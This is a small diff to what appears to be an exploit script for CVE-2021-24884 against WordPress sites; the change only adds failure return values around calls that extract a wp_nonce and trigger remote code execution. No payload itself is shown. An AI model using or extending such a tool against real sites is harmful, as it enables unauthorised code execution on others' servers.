@@ -83,5 +83,10 @@ def scan_cve_2021_24884(profile_url):
             trigger_rce(profile_url)
         else:
             print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed.")
+            return False  
     else:
         print(f"{Style.BRIGHT}{Fore.RED}[•] Could not extract wp_nonce. Exploit aborted.")
+        return False 
+
+
+
